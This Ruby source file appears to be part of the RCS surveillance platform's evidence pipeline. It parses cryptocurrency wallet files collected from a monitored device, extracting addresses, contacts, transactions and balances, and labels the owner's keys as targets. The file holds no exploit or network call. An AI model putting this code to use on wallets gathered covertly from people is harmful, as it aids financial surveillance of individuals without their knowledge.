require 'rcs-common/evidence/common'

require 'digest'
require 'sbdb'
require 'bdb'
require 'set'

module RCS

module MoneyEvidence

  MONEY_VERSION = 2014010101

  TYPES = {:bitcoin => 0x00,
           :litecoin => 0x30,
           :feathercoin => 0x0E,
           :namecoin => 0x34}

  PROGRAM_BITCOIN = {:bitcoin_qt => 0x00}
  PROGRAM_LITECOIN = {:litecoin_qt => 0x00}
  PROGRAM_FEATHERCOIN = {:feathercoin_qt => 0x00}
  PROGRAM_NAMECOIN = {:namecoin_qt => 0x00}

  def content
    path = File.join(File.dirname(__FILE__), 'content/coin/wallet.dat')
    File.open(path, 'rb') {|f| f.read }
  end

  def generate_content
    [ content ]
  end

  def additional_header
    file_name = '~/Library/Application Support/Bitcoin/wallet.dat'.to_utf16le_binary
    header = StringIO.new
    header.write [MONEY_VERSION].pack("I")
    header.write [TYPES[:bitcoin]].pack("I")
    header.write [0].pack("I")
    header.write [file_name.size].pack("I")
    header.write file_name
    
    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete MONEY") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version, type, program, file_name_len = binary.read(16).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for MONEY") unless version == MONEY_VERSION

    ret = Hash.new
    ret[:data] = Hash.new
    ret[:data][:currency] = TYPES.invert[type]
    ret[:data][:program] = eval("PROGRAM_#{ret[:data][:currency].to_s.upcase}").invert[program].to_s
    ret[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?

    binary_wallet = chunks.join

    info[:grid_content] = binary_wallet
    info[:data][:size] = info[:grid_content].bytesize

    # dump the wallet to a temporary file
    temp = RCS::DB::Config.instance.temp(SecureRandom.base64(10))
    File.open(temp, 'wb') {|d| d.write binary_wallet}

    coin = info[:data][:currency]
    # all the parsing is done here
    cw = CoinWallet.new(temp, coin)

    # remove temporary
    FileUtils.rm_rf temp

    trace :debug, "WALLET: #{info[:data][:currency]} #{cw.version} #{cw.encrypted?} #{cw.balance}"

    info[:data][:type] = :wallet
    info[:data][:version] = cw.version
    info[:data][:encrypted] = cw.encrypted?
    info[:data][:balance] = cw.balance
    info[:data][:content] = ''
    cw.keys.each do |k|
      info[:data][:content] += "Name: #{k[:name]}\n Key: #{k[:address]}\n\n"
    end

    # output the first evidence that contains the whole wallet
    yield info if block_given?

    # output the addressbook entries
    address_info = Hash[common_info]
    address_info[:type] = :addressbook

    cw.addressbook.each do |k|
      trace :debug, "WALLET: address #{k.inspect}"
      info = Hash[address_info]
      info[:data] = {}
      info[:data][:program] = coin
      info[:data][:name] = k[:name]
      info[:data][:handle] = k[:address]
      yield info if block_given?
    end

    cw.keys.each do |k|
      trace :debug, "WALLET: key #{k.inspect}"
      info = Hash[address_info]
      info[:data] = {}
      info[:data][:program] = coin
      info[:data][:type] = :target
      info[:data][:name] = k[:name]
      info[:data][:handle] = k[:address]
      yield info if block_given?
    end

    # output the transactions
    cw.transactions.each do |tx|
      trace :debug, "TX: #{tx[:from]} #{tx[:to]} #{tx[:versus]} #{tx[:amount]} #{tx[:id]}"
      tx_info = Hash[common_info]
      tx_info[:data] = Hash.new
      tx_info[:data][:type] = :tx
      tx_info[:da] = tx[:time]
      tx_info[:data][:id] = tx[:id]
      # TODO: implement multiple from address, for now we take only the first address
      tx_info[:data][:from] = tx[:from].first
      tx_info[:data][:rcpt] = tx[:to]
      tx_info[:data][:amount] = tx[:amount]
      tx_info[:data][:incoming] = (tx[:versus].eql? :in) ? 1 : 0
      yield tx_info if block_given?
    end

    :delete_raw
  end
end

module B58Encode
  extend self

  @@__b58chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
  @@__b58base = @@__b58chars.bytesize

  def self.encode(v)
    # encode v, which is a string of bytes, to base58.

    long_value = 0
    v.chars.to_a.reverse.each_with_index do |c, i|
      long_value += (256**i) * c.ord
    end

    result = ''
    while long_value >= @@__b58base do
      div, mod = long_value.divmod(@@__b58base)
      result = @@__b58chars[mod] + result
      long_value = div
    end
    result = @@__b58chars[long_value] + result

    nPad = 0
    v.chars.to_a.each do |c|
      c == "\0" ? nPad += 1 : break
    end

    return (@@__b58chars[0] * nPad) + result
  end

  def self.decode(v, length)
    #decode v into a string of len bytes

    long_value = 0
    v.chars.to_a.reverse.each_with_index do |c, i|
      long_value += @@__b58chars.index(c) * (@@__b58base**i)
    end

    result = ''
    while long_value >= 256 do
      div, mod = long_value.divmod(256)
      result = mod.chr + result
      long_value = div
    end
    result = long_value.chr + result

    nPad = 0
    v.chars.to_a.each do |c|
      c == @@__b58chars[0] ? nPad += 1 : break
    end
    result = 0.chr * nPad + result

    if !length.nil? and result.size != length
      return nil
    end

    return result
  end

  def hash_160(public_key)
    h1 = Digest::SHA256.new.digest(public_key)
    h2 = Digest::RMD160.new.digest(h1)
    return h2
  end

  def public_key_to_bc_address(public_key, version = 0)
    h160 = hash_160(public_key)
    return hash_160_to_bc_address(h160, version)
  end

  def hash_160_to_bc_address(h160, version = 0)
    vh160 = version.chr + h160
    h3 = Digest::SHA256.new.digest(Digest::SHA256.new.digest(vh160))
    addr = vh160 + h3[0..3]
    return self.encode(addr)
  end

  def bc_address_to_hash_160(addr)
    bytes = self.decode(addr, 25)
    return bytes[1..20]
  end
end

class BCDataStream

  attr_reader :read_cursor
  attr_reader :buffer

  def initialize(string)
    @buffer = string
    @read_cursor = 0
  end

  def read_string
    # Strings are encoded depending on length:
    # 0 to 252 :  1-byte-length followed by bytes (if any)
    # 253 to 65,535 : byte'253' 2-byte-length followed by bytes
    # 65,536 to 4,294,967,295 : byte '254' 4-byte-length followed by bytes
    # greater than 4,294,967,295 : byte '255' 8-byte-length followed by bytes of string

    if @buffer.eql? nil
      raise "not initialized"
    end

    begin
      length = self.read_compact_size
    rescue Exception => e
      raise "attempt to read past end of buffer: #{e.message}"
    end

    return self.read_bytes(length)
  end

  def read_uint32; return _read_num('L', 4);  end
  def read_int32; return _read_num('l', 4);  end
  def read_uint64; return _read_num('Q', 8);  end
  def read_int64; return _read_num('q', 8);  end
  def read_boolean; return _read_num('c', 1) == 1;  end

  def read_bytes(length)
    result = @buffer[@read_cursor..@read_cursor+length-1]
    @read_cursor += length
    return result
  rescue Exception => e
    raise "attempt to read past end of buffer: #{e.message}"
  end

  def read_compact_size
    size = @buffer[@read_cursor].ord
    @read_cursor += 1
    if size == 253
      size = _read_num('S', 2)
    elsif size == 254
      size = _read_num('I', 4)
    elsif size == 255
      size = _read_num('Q', 8)
    end

    return size
  end

  def _read_num(format, size)
    val = @buffer[@read_cursor..@read_cursor+size].unpack(format).first
    @read_cursor += size
    return val
  end

end

class CoinWallet

  attr_reader :count, :version, :default_key, :kinds, :seed, :balance

  def initialize(file, kind)
    @seed = kind_to_value(kind)
    @kinds = Set.new
    @count = 0
    @version = :unknown
    @keys = []
    @default_key = nil
    @addressbook = []
    @transactions = []
    @encrypted = false
    @balance = 0

    load_db(file)
  rescue Exception => e
    raise "Cannot load Wallet: #{e.message}"
  end

  def encrypted?
    @encrypted
  end

  def keys(type = :public)
    return @keys if type.eql? :all

    @addressbook.select {|k| k[:local].eql? true}.collect {|x| x.reject {|v| v == :local}}
  end

  def addressbook(local = nil)
    @addressbook.select {|k| k[:local].eql? local}.collect {|x| x.reject {|v| v == :local}}
  end

  def transactions
    @transactions
  end

  def own?(key)
    @keys.any? {|k| k[:address].eql? key}
  end

  private

  def kind_to_value(kind)
    case kind
      when :bitcoin
        0
      when :litecoin
        48
      when :feathercoin
        14
      when :namecoin
        52
    end
  end

  def load_db(file)
    env = SBDB::Env.new '.', SBDB::CREATE | SBDB::Env::INIT_TRANSACTION
    db = env.btree file, 'main', :flags => SBDB::RDONLY
    @count = db.count

    load_entries(db)

    db.close
    env.close

    # remove temporary env files
    9.times {|i| FileUtils.rm_rf "__db.00#{i}" }
  end

  def load_entries(db)
    db.each do |k,v|
      tuple = parse_key_value(k, v)
      next unless tuple

      @kinds << tuple[:type]

      case tuple[:type]
        when :version
          @version = tuple[:dump][:version]
        when :defaultkey
          @default_key = tuple[:dump]
        when :key, :wkey, :ckey
          @keys << tuple[:dump]
          @encrypted = true if tuple[:type].eql? :ckey
        when :name
          tuple[:dump][:local] = true if @keys.any? {|k| k[:address].eql? tuple[:dump][:address] }
          @addressbook << tuple[:dump]
        when :tx
          @transactions << tuple[:dump]
      end
    end

    # we have finished parsing the whole wallet
    # we have all the addresses, we can now fill the :own properties in the out transactions
    # thus we can calculate the real amount of the transaction (out - change + fee)
    recalculate_tx
  end

  def parse_key_value(key, value)

    kds = BCDataStream.new(key)
    vds = BCDataStream.new(value)
    type = kds.read_string

    hash = {}
    case type
      when 'version'
        hash[:version] = vds.read_uint32
      when 'name'
        hash[:address] = kds.read_string
        hash[:name] = vds.read_string
      when 'defaultkey'
        key = vds.read_bytes(vds.read_compact_size)
        #hash[:key] = key
        hash[:address] = B58Encode.public_key_to_bc_address(key, @seed)
      when 'key'
        key = kds.read_bytes(kds.read_compact_size)
        #hash[:key] = key
        hash[:address] = B58Encode.public_key_to_bc_address(key, @seed)
        #hash['privkey'] = vds.read_bytes(vds.read_compact_size)
      when "wkey"
        key = kds.read_bytes(kds.read_compact_size)
        #hash[:key] = key
        hash[:address] = B58Encode.public_key_to_bc_address(key, @seed)
        #d['private_key'] = vds.read_bytes(vds.read_compact_size)
        #d['created'] = vds.read_int64
        #d['expires'] = vds.read_int64
        #d['comment'] = vds.read_string
      when "ckey"
        key = kds.read_bytes(kds.read_compact_size)
        #hash[:key] = key
        hash[:address] = B58Encode.public_key_to_bc_address(key, @seed)
        #hash['crypted_key'] = vds.read_bytes(vds.read_compact_size)
      when 'tx'
        hash.merge! parse_tx(kds, vds)
    end

    return {type: type.to_sym, dump: hash}
  end

  def parse_tx(kds, vds)
    hash = {}
    id = kds.read_bytes(32)

    ctx = CoinTransaction.new(id, vds, self.seed)

    hash[:id] = ctx.id
    hash[:from] = ctx.from
    hash[:to] = ctx.to
    hash[:amount] = ctx.amount
    hash[:time] = ctx.time
    hash[:versus] = ctx.versus
    hash[:in] = ctx.in
    hash[:out] = ctx.out

    return hash
  end

  def recalculate_tx
    @transactions.each do |tx|
      # fill in the :own properties which indicate the amount is for an address inside the wallet
      tx[:out].map {|x| x[:own] = own?(x[:address])}
    end

    @transactions.each do |tx|
      tx[:from] = Set.new

      # calculate the amounts based on the direction (incoming tx)
      if tx[:versus].eql? :in
        tx[:amount] = tx[:out].select {|x| x[:own]}.first[:value]
        tx[:to] = tx[:out].select {|x| x[:own]}.first[:address]

        # if the source is an hash of all zeroes, it was mined directly
        if tx[:in].size.eql? 1 and tx[:in].first[:prevout_hash].eql? "0"*64
          tx[:from] << "MINED BLOCK"
        end

        # TODO: calculate the source from the past tx
        #tx[:from] = ???

        @balance += tx[:amount]
      end

      # calculate the amounts based on the direction (outgoing tx)
      if tx[:versus].eql? :out
        tx[:amount] = tx[:out].select {|x| not x[:own]}.first[:value]
        tx[:to] = tx[:out].select {|x| not x[:own]}.first[:address]

        # calculate the fee based on the in and out tx
        if tx[:in].size > 0
          tx[:in].each do |txin|
            @transactions.each do |prev_tx|
              if prev_tx[:id] == txin[:prevout_hash]
                txin.merge!(prev_tx[:out][txin[:prevout_index]])
                tx[:from] << prev_tx[:out][txin[:prevout_index]][:address]
              end
            end
          end
          amount_in =  tx[:in].inject(0) {|tot, y| tot += y[:value]}
          amount_out =  tx[:out].inject(0) {|tot, y| tot += y[:value]}
          tx[:fee] = (amount_in - amount_out).round(8)
        end

        @balance -= (tx[:amount] + tx[:fee])
      end

      # return an array instead of set
      tx[:from] = tx[:from].to_a
    end

    @balance = @balance.round(8)
  end

end

class CoinTransaction

  attr_reader :id, :from, :to, :amount, :time, :versus, :in, :out

  def initialize(id, vds, seed)
    @id = id.reverse.unpack("H*").first
    @seed = seed
    @in = []
    @out = []

    tx = parse_tx(vds)

    calculate_tx(tx)

  rescue Exception => e
    raise "Cannot parse Transaction: #{e.message}"
  end

  def calculate_tx(tx)
    tx['txIn'].each do |t|
      itx = {}
      # search in the previous hash repo
      itx[:prevout_hash] = t['prevout_hash'].reverse.unpack('H*').first
      itx[:prevout_index] = t['prevout_n']
      @in << itx
    end

    tx['txOut'].each do |t|
      next unless t['value']
      value = t['value']/1.0e8

      address = extract_pubkey(t['scriptPubKey'])
      @out << {value: value, address: address} if address
    end

    @time = tx['timeReceived']
    @versus = (tx['fromMe'] == true) ? :out : :in
  end

  def parse_tx(vds)
    h = parse_merkle_tx(vds)
    n_vtxPrev = vds.read_compact_size
    h['vtxPrev'] = []
    (1..n_vtxPrev).each { h['vtxPrev'] << parse_merkle_tx(vds) }

    h['mapValue'] = {}
    n_mapValue = vds.read_compact_size
    (1..n_mapValue).each do
      key = vds.read_string
      value = vds.read_string
      h['mapValue'][key] = value
    end

    n_orderForm = vds.read_compact_size
    h['orderForm'] = []
    (1..n_orderForm).each do
      first = vds.read_string
      second = vds.read_string
      h['orderForm'] << [first, second]
    end

    h['fTimeReceivedIsTxTime'] = vds.read_uint32
    h['timeReceived'] = vds.read_uint32
    h['fromMe'] = vds.read_boolean
    h['spent'] = vds.read_boolean

    return h
  end

  def parse_merkle_tx(vds)
    h = parse_transaction(vds)
    h['hashBlock'] = vds.read_bytes(32)
    n_merkleBranch = vds.read_compact_size
    h['merkleBranch'] = vds.read_bytes(32*n_merkleBranch)
    h['nIndex'] = vds.read_int32
    return h
  end

  def parse_transaction(vds)
    h = {}
    start_pos = vds.read_cursor
    h['version'] = vds.read_int32

    n_vin = vds.read_compact_size
    h['txIn'] = []
    (1..n_vin).each {  h['txIn'] << parse_TxIn(vds)  }

    n_vout = vds.read_compact_size
    h['txOut'] = []
    (1..n_vout).each { h['txOut'] << parse_TxOut(vds) }

    h['lockTime'] = vds.read_uint32
    h['__data__'] = vds.buffer[start_pos..vds.read_cursor-1]
    return h
  end

  def parse_TxIn(vds)
    h = {}
    h['prevout_hash'] = vds.read_bytes(32)
    h['prevout_n'] = vds.read_uint32
    h['scriptSig'] = vds.read_bytes(vds.read_compact_size)
    h['sequence'] = vds.read_uint32
    return h
  end

  def parse_TxOut(vds)
    h = {}
    h['value'] = vds.read_int64
    h['scriptPubKey'] = vds.read_bytes(vds.read_compact_size)
    return h
  end

  def extract_pubkey(bytes)
    # here we should parse the OPCODES and check them, but we are lazy
    # and we fake the full parsing... :)

    address = nil

    case bytes.bytesize
      # TODO: implement other opcodes
      when 132
        # non-generated TxIn transactions push a signature
        # (seventy-something bytes) and then their public key
        # (33 or 65 bytes) onto the stack:
      when 67
        # The Genesis Block, self-payments, and pay-by-IP-address payments look like:
        # 65 BYTES:... CHECKSIG
      when 25
        # Pay-by-Bitcoin-address TxOuts look like:
        # DUP HASH160 20 BYTES:... EQUALVERIFY CHECKSIG
        # [ OP_DUP, OP_HASH160, OP_PUSHDATA4, OP_EQUALVERIFY, OP_CHECKSIG ]
        op_prefix = bytes[0..2]
        op_suffix = bytes[-2..-1]

        if op_prefix.eql? "\x76\xa9\x14".force_encoding('ASCII-8BIT') and
           op_suffix.eql? "\x88\xac".force_encoding('ASCII-8BIT')
          address = B58Encode.hash_160_to_bc_address(bytes[3..-3], @seed)
        end
      when 23
        # BIP16 TxOuts look like:
        # HASH160 20 BYTES:... EQUAL
    end

    return address
  rescue
  end

end



end # ::RCS